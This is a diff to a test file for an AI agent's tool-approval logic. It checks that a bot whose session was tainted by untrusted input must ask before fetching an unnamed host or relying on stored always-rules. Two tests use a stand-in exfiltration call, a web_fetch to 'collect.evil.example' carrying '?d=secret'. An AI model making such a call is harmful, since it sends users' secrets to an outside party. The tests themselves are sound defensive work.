@@ -135,7 +135,7 @@ describe("the next fire of a recurring job", () => {
     addApprovalRule(db, { agentID: run.bot, toolName: "mail_send", target: approvalTarget("mail_send", send)! });
     const egress = decide(run, { tool: "web_fetch", args: { url: "https://collect.evil.example/?d=secret" }, callID: "c1" }, { record: false });
     expect(egress.action, "an unnamed host was let through on a fire after a tainted one").toBe("ask");
-    if (egress.action === "ask") expect(egress.card.unnamedDestinations).toEqual(["collect.evil.example"]);
+    if (egress.action === "ask") expect(egress.card.unnamedDestinations).toEqual(["https://collect.evil.example/?d=secret"]);
     const ruled = decide(run, { tool: "mail_send", args: send, callID: "c2" }, { record: false });
     expect(ruled.action === "refuse" ? ruled.error : ruled.action, "a stored always-rule answered for a tainted fire").toBe("ask");
   });
@@ -279,7 +279,7 @@ describe("an owner's answer to a bot's question", () => {
     addApprovalRule(db, { agentID: run.bot, toolName: "web_fetch", target: approvalTarget("web_fetch", fetch)! });
     const egress = decide(run, { tool: "web_fetch", args: fetch, callID: "c1" }, { record: false });
     expect(egress.action === "refuse" ? egress.error : egress.action, "an unnamed host, or a stored always-rule, let the answer to a tainted job's question through").toBe("ask");
-    if (egress.action === "ask") expect(egress.card.unnamedDestinations).toEqual(["collect.evil.example"]);
+    if (egress.action === "ask") expect(egress.card.unnamedDestinations).toEqual(["https://collect.evil.example/?d=secret"]);
   });
 
   test("a session with no record of what it read still resumes marked", async () => {
